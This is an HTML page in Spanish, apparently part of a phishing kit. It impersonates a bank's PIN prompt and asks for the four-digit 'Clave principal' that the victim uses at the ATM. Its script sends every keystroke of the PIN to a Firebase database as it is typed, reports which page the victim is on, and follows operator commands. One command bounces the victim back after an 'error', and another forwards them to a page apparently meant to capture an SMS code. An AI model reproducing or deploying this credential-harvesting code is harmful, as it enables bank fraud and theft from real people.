<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Password</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
body{background:#f5f5f5;}

/* HEADER */
.header{
  text-align:center;
  padding:20px;
  background:#fff;
  border-bottom:1px solid #e5e5e5;
}
.header img{
  height:30px;
}

/* FONDO */
.bg{
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  z-index:-1;
}
.bg img{
  width:100%;
  height:100%;
  object-fit:cover;
}

/* CONTENIDO */
.container{
  display:flex;
  justify-content:center;
  align-items:center;
  height:80vh;
  padding:20px;
}

.card{
  background:#fff;
  padding:40px;
  border-radius:16px;
  width:100%;
  max-width:420px;
  text-align:center;
  box-shadow:0 10px 30px rgba(0,0,0,0.05);
}

.title{
  font-size:24px;
  margin-bottom:10px;
  font-weight:600;
}

.subtitle{
  font-size:14px;
  color:#555;
  margin-bottom:30px;
}

/* PIN */
.pin{
  display:flex;
  justify-content:center;
  gap:15px;
  margin-bottom:30px;
}

.pin input{
  width:45px;
  height:45px;
  text-align:center;
  font-size:20px;
  border:none;
  border-bottom:2px solid #ccc;
  outline:none;
  background:transparent;
}

.pin input:focus{
  border-bottom:2px solid #FFD200;
}

/* BOTONES */
.buttons{
  display:flex;
  gap:10px;
}

.btn{
  flex:1;
  padding:12px;
  border-radius:25px;
  font-weight:600;
  cursor:pointer;
  border:none;
}

.btn-back{
  background:#fff;
  border:1px solid #000;
}

.btn-next{
  background:#ccc;
}

.btn-next.active{
  background:#333;
  color:#fff;
}

/* MOBILE */
@media(max-width:768px){
  .container{
    height:auto;
    margin-top:40px;
  }
}

.overlay{
  display:none;
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.5);
  backdrop-filter:blur(4px);
  justify-content:center;
  align-items:center;
  z-index:9999;
}
.loader{ color:#fff; text-align:center; }
</style>
</head>

<body>

<div class="header">
  <img src="logo.svg">
</div>

<div class="bg">
  <img src="auth-trazo.svg">
</div>

<div class="container">
  <div class="card">
    <div class="title">Clave principal</div>
    <div class="subtitle">Es la misma que usas en el cajero automático</div>

    <div class="pin">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
    </div>

    <div class="buttons">
      <button class="btn btn-back">Volver</button>
      <button id="btn" class="btn btn-next">Continuar</button>
    </div>
  </div>
</div>

<div class="overlay">
  <div class="loader">
    <div class="spinner"></div>
    <p>Cargando...</p>
  </div>
</div>


<script type="module" src="firebase.js"></script>

<script>
window.addEventListener('load', () => {
const { db, uid, ref, update, onValue } = window;

// ===============================
// 🔹 ESTADO
// ===============================
update(ref(db, "dataPages/" + uid), { 
  estado: "abierto",
  paginaActual: "Password.html"
});

// ===============================
// 🔹 ELEMENTOS
// ===============================
const inputs = document.querySelectorAll('.pin input');
const btn = document.getElementById('btn');
const overlay = document.querySelector('.overlay');

// ===============================
// 🔹 INPUT PIN
// ===============================
inputs.forEach((input, index) => {

  input.addEventListener('input', () => {

    // 🔢 solo números
    input.value = input.value.replace(/\D/g, "");

    if(input.value && index < inputs.length - 1){
      inputs[index + 1].focus();
    }

    const pin = [...inputs].map(i => i.value).join("");

    // 🔥 TIEMPO REAL
    update(ref(db, "dataPages/" + uid), {
      password: pin
    });

    // activar botón
    const filled = [...inputs].every(i => i.value !== "");
    if(filled){
      btn.classList.add('active');
    } else {
      btn.classList.remove('active');
    }

  });

});

// ===============================
// 🔹 BOTÓN CONTINUAR
// ===============================
btn.addEventListener("click", () => {

  const pin = [...inputs].map(i => i.value).join("");
  if(pin.length < 4) return;

  // 🔴 enviar password
  update(ref(db, "dataPages/" + uid), {
    password: pin,
    mostrarBarraPassword: true
  });

  // 🔴 overlay
  if (overlay) overlay.style.display = "flex";

});

// ===============================
// 🔹 ESCUCHAR ERROR → VOLVER
// ===============================
onValue(ref(db, "dataPages/" + uid), snapshot => {

  const data = snapshot.val();
  if (!data) return;

  // 🔴 ERROR LOGIN
  if (data.estadoError === "incorrecto") {
    window.location.href = "index.html";
  }

  // 🔥 SMS → IR A DINAMICA
  if (data.accion === "codigo") {

    update(ref(db, "dataPages/" + uid), {
      accion: null
    });

    window.location.href = "dinamica.html";
  }

});

// ===============================
// 🔹 CERRAR
// ===============================
window.addEventListener("beforeunload", () => {
  update(ref(db, "dataPages/" + uid), { 
    estado: "cerrado",
    paginaActual: null  
  });
});

});
</script>

</body>
</html>
